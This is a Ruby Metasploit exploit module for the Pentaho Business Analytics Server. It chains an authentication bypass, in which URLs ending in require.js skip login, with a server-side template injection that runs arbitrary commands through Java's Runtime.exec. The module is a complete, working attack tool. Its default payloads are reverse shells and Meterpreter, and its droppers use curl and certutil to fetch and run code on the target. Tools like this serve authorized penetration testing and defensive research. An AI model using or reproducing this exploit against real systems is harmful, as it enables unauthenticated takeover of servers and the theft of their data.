##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

class MetasploitModule < Msf::Exploit::Remote
  Rank = ExcellentRanking

  include Msf::Exploit::Remote::HttpClient
  include Msf::Exploit::CmdStager

  prepend Msf::Exploit::Remote::AutoCheck

  def initialize(info = {})
    super(
      update_info(
        info,
        'Name' => 'Pentaho Business Server Auth Bypass and Server Side Template Injection RCE',
        'Description' => %q{
          This module exploits two vulnerabilities which results in unauthenticated code execution in the context of the
          user running the Pentaho Business Analytics Server. The first vulnerability is an authentication bypass which
          stems from a regex that allows any url that ends `require.js` to bypass authentication. The second is a server
          side template injection which allows java code to be injected into the `url` parameter when sent to the
          following endpoint: `/api/ldap/config/ldapTreeNodeChildren`
        },
        'Author' => [
          'dwbzn', # Discovery & PoC
          'jheysel-r7' # Module
        ],
        'References' => [
          [ 'URL', 'https://github.com/dwbzn/pentaho-exploits/blob/main/cve-2022-43769.py'],
          [ 'CVE', '2022-43769'], # RCE
          [ 'CVE', '2022-43939']  # Auth Bypass
        ],
        'License' => MSF_LICENSE,
        'Privileged' => false,
        'Platform' => ['win', 'unix'],
        'Arch' => [ ARCH_CMD, ARCH_X86, ARCH_X64 ],
        'Targets' => [
          [
            'Unix Command',
            {
              'Platform' => 'unix',
              'Arch' => ARCH_CMD,
              'Type' => :unix_cmd,
              'DefaultOptions' => {
                'PAYLOAD' => 'cmd/unix/reverse_openssl'
              }
            }
          ],
          [
            'Linux Dropper',
            {
              'Platform' => 'linux',
              'Arch' => [ARCH_X86, ARCH_X64],
              'Type' => :linux_dropper,
              'CmdStagerFlavor' => :curl,
              'DefaultOptions' => {
                'PAYLOAD' => 'linux/x86/meterpreter_reverse_tcp'
              }
            }
          ],
          [
            'Windows Command',
            {
              'Platform' => 'win',
              'Arch' => ARCH_CMD,
              'Type' => :win_cmd,
              'DefaultOptions' => {
                'PAYLOAD' => 'cmd/windows/powershell_reverse_tcp'
              }
            }
          ],
          [
            'Windows Dropper',
            {
              'Platform' => 'win',
              'Arch' => [ARCH_X86, ARCH_X64],
              'Type' => :win_dropper,
              'CmdStagerFlavor' => :certutil,
              'DefaultOptions' => {
                'PAYLOAD' => 'windows/x64/meterpreter_reverse_tcp'
              }
            }
          ],
        ],
        'DefaultTarget' => 0,
        'DisclosureDate' => '2023-04-04',
        'Notes' => {
          'Stability' => [ CRASH_SAFE ],
          'SideEffects' => [ ARTIFACTS_ON_DISK ],
          'Reliability' => [ REPEATABLE_SESSION ]
        }
      )
    )

    register_options(
      [
        Opt::RPORT(8080),
        OptString.new('TARGETURI', [true, 'Base path', '/pentaho'])
      ]
    )
  end

  def check
    # This check method abuses the authentication bypass vulnerability CVE-2022-43939 to check exploitability. Due to a
    # bad regex in applicationContext-spring-security.xml endpoints that should not be accessible without authentication
    # are made accessible if the URL ends in require.js

    res = send_request_cgi(
      'method' => 'GET',
      'uri' => normalize_uri(target_uri.path, 'api', 'ldap', 'config', 'ldapTreeNodeChildren', 'require.js')
    )

    return Exploit::CheckCode::Unknown unless res

    if res.code == 200 && res.body == '{}'
      Exploit::CheckCode::Appears
    elsif res.code == 401
      Exploit::CheckCode::Safe
    else
      Exploit::CheckCode::Unknown
    end
  end

  def win_target?
    target.platform.names.first == 'Windows'
  end

  def execute_command(cmd, _opts = {})
    java_payload = <<~JAVA.gsub(/^\s+/, '').tr("\n", '')
      {T(java.lang.Runtime).getRuntime().exec(
        new String[]{ #{win_target? ? '"cmd.exe", "/c", ' : '"/bin/sh", "-c", '}'#{cmd.gsub("'", "''")}'}
        )
      }
    JAVA

    # Dropper payloads contain \ characters which cause the server to throw a 400
    java_payload.gsub!('\\', '%5C')

    res = send_request_cgi(
      'method' => 'GET',
      'uri' => normalize_uri(target_uri.path, 'api', 'ldap', 'config', 'ldapTreeNodeChildren', 'require.js'),
      'vars_get' => {
        'url' => "##{java_payload}",
        'mgrDn' => 'a',
        'pwd' => 'a'
      }
    )

    unless res
      fail_with(Failure::UnexpectedReply, 'No response from the server when attempting to exploit')
    end

    unless res.code == 200 && res.body == 'false'
      fail_with(Failure::UnexpectedReply, "Unexpected response code:#{res.code}, when attempting to exploit")
    end

    print_good('Exploit successful')
  end

  def exploit
    print_status('Attempting to exploit...')
    case target['Type']
    when :unix_cmd
      execute_command(payload.encoded)
    when :linux_dropper
      execute_cmdstager
    when :win_cmd
      execute_command(payload.encoded)
    when :win_dropper
      execute_cmdstager
    end
  end
end
